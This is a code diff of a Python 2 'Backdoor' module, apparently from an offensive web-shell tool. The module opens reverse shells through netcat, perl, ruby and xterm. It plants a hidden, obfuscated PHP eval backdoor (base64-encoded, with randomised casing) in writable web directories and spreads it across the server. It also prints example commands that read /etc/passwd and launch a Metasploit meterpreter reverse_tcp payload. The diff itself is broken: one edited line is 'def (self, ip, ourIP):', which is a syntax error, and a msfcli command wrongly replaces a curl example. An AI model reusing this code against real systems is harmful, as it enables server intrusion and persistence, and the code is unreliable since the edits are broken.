@@ -1,12 +1,11 @@
-import random
-import string
-import base64
-import itertools
 from subprocess import Popen, PIPE
+from platform import platform as os
 
 from core.libs.menu import Colors, getargs
 from core.libs.request_handler import make_request
 from core.modules.shell_handler import linux
+
+import random, string
 
 
 # Source: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet (Thanks @pentestmonkey)
@@ -31,6 +30,13 @@ class Backdoor(object):
         print '[i] \tspread  \t\tSpread this shell around'
         #print '[i] \t*xterm  \t\tUse xterm to create a reverse shell'
 
+    # Redefinition on function "netcat"
+    #def netcat(self, ip, port):
+    #    print '\n{0}[i] Make sure \'{1}\' has a listener shell ALREADY setup on port: \'{2}\'{3}'.format(Colors.GREEN, ip, port, Colors.END)
+    #    cmd = '{0} {1} {2} -e /bin/bash'.format(path, ip, port)
+    #    self.make_request.get_page_source(cmd)
+    #    print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
+
     def msf(self, ip, port):
         if len(Popen("for x in `whereis msfvenom`; do file $x | grep symbolic; done", shell=True, stdout=PIPE).stdout.read().strip()) == 0:
             print '\n{0}[!] Wasn\'t able to detect the metasploit framework{1}'.format(Colors.RED, Colors.END)
@@ -49,6 +55,7 @@ class Backdoor(object):
                 print '{0}[+] Sending payload & executing{1}'.format(Colors.GREEN, Colors.END)
                 make_request.get_page_source(cmd)
                 print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
+
 
     def netcat(self, ip, port):
         '''
@@ -71,6 +78,7 @@ class Backdoor(object):
             print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
         else:
             print '\n{0}[!] Didn\'t find netcat on the remote system{1}'.format(Colors.RED, Colors.END)
+
 
     def perl(self, ip, port):
         cmd = "for x in `whereis perl`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
@@ -95,19 +103,20 @@ class Backdoor(object):
         else:
             print '\n{0}[!] Didn\'t find perl on the remote system{1}'.format(Colors.RED, Colors.END)
 
-    def php(self, ip):
+
+    def (self, ip, ourIP):
         wwwroot = linux.get_doc_root()
         cmd = 'find {0} -depth -perm -0002 -type d | sort -R | head -n 1'.format(wwwroot)       # Ths could be put into a function? this/spread/get_writble_dir
         folder = make_request.get_page_source(cmd)
         if folder:
             folder = folder[0]
             print '\n{0}[+] Found a writable directory: \'{1}\'{2}'.format(Colors.GREEN, folder, Colors.END)
-            filename = '.' + ''.join(random.choice(string.ascii_letters + string.digits) for x in range(8)) + '.php'     # Ths could be put into a function? Snap! (<--with msf)
+            filename = '.'+''.join(random.choice(string.ascii_letters + string.digits) for x in range(8))+'.php'     # Ths could be put into a function? Snap! (<--with msf)
             print '{0}[+] Filename: \'{1}\'{2}'.format(Colors.GREEN, filename, Colors.END)
             location = '{0}/{1}'.format(folder, filename)
 
             cmd = 'find {0} -type f -print'.format(wwwroot)
-            files = make_request.get_page_source(cmd)
+            files=make_request.get_page_source(cmd)
             print '{0}[i] Select a file to \'clone\' (or \'0\' to skip):{1}'.format(Colors.GREEN, Colors.END)
             print '{0} 0.) Don\'t close - create new{1}'.format(Colors.GREEN, Colors.END)
             path = []
@@ -119,30 +128,28 @@ class Backdoor(object):
 
             while True:
                 try:
-                    clone = int(raw_input('{0}[>] Which file to use? [0-{1}]: {2}'.format(Colors.GREEN, c, Colors.END)))
+                    clone=int(raw_input('{0}[>] Which file to use? [0-{1}]{2}: '.format(Colors.GREEN, c, Colors.END)))
                     if 0 <= clone <= c:
                         break
                 except ValueError:
                     pass
 
         if clone is not "0":
-            cmd = 'cp -f {0} {1}'.format(path[int(clone) - 1], location)
+            cmd = 'cp -f {0} {1}'.format(path[int(clone)-1], location)
             make_request.get_page_source(cmd)
-
             print '{0}[+] Creating our \'evil\' file: \'{1}\'{2}'.format(Colors.GREEN, location, Colors.END)
             parameter = ''.join(random.choice(string.ascii_lowercase) for x in range(6))
-            casePayload = random.choice(map(''.join, itertools.product(*((c.upper(), c.lower()) for c in 'eval'))))
-            caseShell = random.choice(map(''.join, itertools.product(*((c.upper(), c.lower()) for c in 'php eval(base64_decode'))))
+            import base64, itertools
+            casePayload=random.choice(map(''.join, itertools.product(*((c.upper(), c.lower()) for c in 'eval'))))
+            caseShell=random.choice(map(''.join, itertools.product(*((c.upper(), c.lower()) for c in 'php eval(base64_decode'))))
             payload = "{0}($_GET['{1}'].';');".format(casePayload, parameter)
             payloadEncoded = base64.b64encode(payload).format(payload)
-            evilFile = "<?{0}(\"{1}\")); ?>".format(caseShell, payloadEncoded)
+            evilFile= "<?{0}(\"{1}\")); ?>".format(caseShell, payloadEncoded)
             cmd = 'echo \'{0}\' >> \"{1}\"'.format(evilFile, location)
             make_request.get_page_source(cmd)
-
             print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
-
             uri = folder[len(wwwroot):]
-            print '{0}[i] Example:\n[i]\tcurl "{1}{2}/{3}?{4}=require(\'/etc/passwd\')"\n[i]\tcurl "{1}{2}/{3}?{4}=system(\'/sbin/ifconfig\')"{5}'.format(Colors.GREEN, ip, uri, filename, parameter, Colors.END)  # Need to add  http or https infront
+            print '{0}[i] Example:\n[i]\tcurl "{1}{2}/{3}?{4}=require(\'/etc/passwd\')"\n[i]\tmsfcli "{1}{2}/{3}?{4}=system(\'/sbin/ifconfig\')"\n[i]\tmsfcli exploit/unix/webapp/php_eval RHOST={1} RPORT=80 PHPURI={2}/{3}?{4}=\!CODE\! PAYLOAD=php/meterpreter/reverse_tcp LHOST={5}{6} LPORT=4444 E'.format(Colors.GREEN, ip, uri, filename, parameter, ourIP, Colors.END)  # Need to add  http or https infront
         else:
             print '\n{0}[!] Unable to find a writable directory'.format(Colors.RED, Colors.END)
 
@@ -189,6 +196,7 @@ class Backdoor(object):
         else:
             print '\n{0}[!] Didn\'t find python on the remote system{1}'.format(Colors.RED, Colors.END)
 
+            
     def ruby(self, ip, port):
         cmd = "for x in `whereis ruby`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
         ruby = make_request.get_page_source(cmd)
@@ -208,6 +216,7 @@ class Backdoor(object):
         else:
             print '\n{0}[!] Didn\'t find ruby on the remote system{1}'.format(Colors.RED, Colors.END)
 
+            
     # A method to spread the shell in all writable directories
     def spread(self):
         provided_shell_name = raw_input('\n{0}[?] Current shell name{1}: '.format(Colors.GREEN, Colors.END))
@@ -225,6 +234,7 @@ class Backdoor(object):
         else:
             print '\n{0}[!] Something went wrong while spreading shell{1}'.format(Colors.RED, Colors.END)
 
+            
     def xterm(self, ip):
         cmd = "for x in `whereis xterm`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
         xterm = make_request.get_page_source(cmd)
@@ -234,7 +244,7 @@ class Backdoor(object):
             for path in xterm:
                 print '{0}{1:2d}- {2}{3}'.format(Colors.GREEN, c, path, Colors.END)
                 c += 1
-            #raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: nc -lvvp {2})\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
+            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: nc -lvvp {2})\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
             for path in xterm:
                 cmd = 'nohup {0} xterm -display {1}:1 &'.format(path, ip)
                 make_request.get_page_source(cmd)
